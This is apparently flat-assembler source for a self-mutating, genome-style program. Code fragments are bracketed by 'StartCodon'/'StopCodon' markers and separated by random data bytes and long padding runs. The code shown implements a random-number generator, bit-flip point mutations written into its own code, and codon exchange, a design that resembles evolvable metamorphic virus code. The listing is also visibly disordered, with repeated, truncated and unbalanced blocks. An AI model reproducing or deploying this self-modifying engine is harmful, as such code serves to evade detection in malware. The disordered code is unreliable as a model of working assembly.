db 35
db 232
db 192
db 80
db 85
db 196
db 216
db 192
db 179
db 22
db 235
db 122
db 220
db 229
db 144
db 78
db 28
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _shl                     ; shl BC1, BC2
       _save
       _pop
       _push
       _saveWrtOff              ; BA1=[MapPointer]+counter
       _getdata                 ; mov BC1, dword[BC1]
       _xor                     ; xor BC1, BC2
       _nopdB                   ; save changed byte
_save           ; BC2=BC1
db StopCodon
db 130
db 235
db 44
db 16
db 189
db 112
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=7
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 107
db 186
db 2
db 90
db 191
db 0
db 194
db 154
db 44
db 97
db 26
db 96
db 183
db 202
db 27
db 150
db 13
db 105
db 135
db 93
db 25
db 237
db 190
db 178
db 155
db 102
db 106
db 207
db 180
db 130
db 28
db 162
db 81
db 193
db 193
db 231
db 73
db 13
db 232
db 173
db 231
db 117
db 224
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 3
db 90
db 191
db 221
db 126
db 103
db 87
db 111
db 193
db 98
db 215
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 94
db 19
db 146
db 71
db 21
db 214
db 169
db 20
db 68
db 53
db 28
db 56
db 116
db 66
db 232
db 202
db 124
db 221
db 66
db 118
db 84
db 139
db 147
db 1
db 241
db 139
db 26
db 242
db 12
db 14
db 82
db 145
db 99
db 88
db 50
db 180
db 72
db 219
db 86
db 12
db 116
db 8
db 255
db 119
db 120
db 246
db 55
db 53
db 111
db 136
db 240
db 209
db 176
db 19
db 35
db 238
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
db StopCodon
db 83
db 87
db 124
db 121
db StartCodon
       _nopdA
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 205
db 199
db 170
db 211
db 247
db 191
db 124
db 15
db 89
db 219
db 23
db 166
db 240
db 199
db 103
db 149
db 122
db 2
db 238
db 78
db 190
db 247
db 86
db 53
db 87
db 82
db 214
db 204
db 15
db 78
db 182
db 198
db 114
db 244
db 208
db 230
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 211
db 6
db 198
db 235
db 148
db 136
db 66
db 101
db 114
db 244
db 127
db 39
db 17
db 167
db 127
db 150
db 200
db 103
db 106
db 106
db 110
db 171
db 232
db 177
db 168
db 35
db 252
db 216
db 142
db 205
db 112
db 238
db 173
db 221
db 193
db 163
db 193
db 39
db 40
db 117
db 109
db 232
db 10
db 167
db 203
db 162
db 158
db 212
db 197
db 51
db 123
db 122
db 177
db StartCodon
       _nopdD
    BigNum=VarThreshold1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 19
db 142
db 202
db 23
db 137
db 149
db 205
db 51
db 26
db 239
db 224
db 168
db 102
db 238
db 186
db 250
db 240
db 76
db 138
db 136
db 212
db 71
db 157
db 122
db 94
db 173
db 215
db 134
db 211
db 107
db 198
db 74
db 255
db 117
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div
       _nopsD
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 60
db 216
db 1
db 197
db 130
db 238
db 99
db 31
db 26
db 196
db 187
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 149
db 190
db 151
db 208
db 164
db 2
db 184
db 91
db 205
db 242
db 21
db 250
db 170
db 139
db 163
db 2
db 165
db 233
db 220
db 42
db 228
db 32
db 216
db 168
db 148
db 248
db 237
db 33
db 138
db 225
db 158
db 254
db 15
db 227
db StartCodon
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 98
db 198
db 39
db StartCodon
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
db StopCodon
db 149
db 77
db 91
db 212
db 166
db 141
db 160
db 29
db 209
db 126
db 7
db 9
db 119
db 167
db 28
db 83
db StartCodon
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzDown
               _nopsB                   ; restore
               _writeByte               ; save mutation!
               _nopREAL
               _nopREAL
; ##### Finished Bit-Flip Mutation (Point-Mutation)
; ############################################################################
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 23
db 220
db 207
db 127
db 26
db 255
db 42
db 7
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 114
db 250
db 248
db 51
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 39
db 46
db 3
db 29
db 87
db 196
db 49
db 20
db 129
db 61
db 128
db 13
db 8
db 96
db 132
db 106
db 199
db 16
db 64
db 251
db 195
db 117
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 76
db 183
db 107
db 54
db 235
db 212
db 8
db 73
db 1
db 198
db 246
db 1
db 6
db 182
db 61
db 245
db 22
db 45
db 125
db 111
db 91
db 107
db 240
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
db StopCodon
db 174
db 235
db 8
db 195
db 57
db 37
db 198
db 211
db 25
db 32
db 0
db 5
db 223
db 245
db 106
db 217
db 158
db 94
db 224
db 4
db 36
db 232
db 205
db 4
db 3
db 186
db 23
db 164
db 170
db 249
db 43
db 227
db 140
db 48
db 127
db 90
db 240
db StartCodon
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
; ############################################################################
; ##### Start codons exchange
    _getDO
    BigNum=xchgBuffer-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 121
db 136
db 254
db 57
db 137
db 191
db 25
db 8
db 125
db 222
db 189
db 121
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 173
db 153
db 86
db 181
db 107
db 172
db 177
db 107
db 68
db 3
db 252
db 53
db 144
db 238
db 0
db 226
db 31
db 17
db 21
db 228
db 165
db 196
db 178
db 122
db 240
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
       _pop
       _push                        ; get counter
       _getdata
       _writeDWord                  ; xchgBuffer=dword[counter]
       _pop
       _push                        ; get counter
       _saveWrtOff                  ; save destination for potential writing
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 175
db 208
db 255
db 82
db 135
db 54
db 115
db 96
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 193
db 119
db 12
db 97
db 150
db 252
db 79
db 172
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB                       ; RegB=dword[counter+4]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=7
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 194
db 156
db 29
db 253
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
db StopCodon
db 69
db 206
db 209
db 67
db 7
db 57
db 239
db 163
db 187
db StartCodon
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
       _nopdD
db StopCodon
db 4
db 64
db 34
db 252
db 163
db 177
db 232
db 49
db 3
db 45
db 236
db 255
db 114
db 226
db 10
db 41
db 163
db 194
db 50
db 149
db 29
db 218
db 222
db 240
db 199
db 238
db 255
db 92
db 199
db 10
db 26
db 149
db 49
db 33
db 49
db 3
db 37
db 107
db 113
db 234
db 248
db 88
db 76
db 191
db 223
db 204
db 164
db 105
db 252
db 145
db 7
db 227
db 105
db 98
db 94
db 202
db 7
db 69
db 17
db 139
db 238
db 107
db 201
db 167
db 105
db 208
db 90
db 221
db 165
db 26
db 140
db 47
db 48
db 153
db 185
db 172
db 85
db 8
db StartCodon
    BigNum=xchgThreshold1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div
       _nopsD
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzDown                 ; if not zero, dont exchange codons
           _nopsB                   ; restore
           _writeDWord              ; save mutation!
           _nopREAL
           _nopREAL
    _getDO
    BigNum=xchgBuffer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB
       _pop
       _push                    ; get counter
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
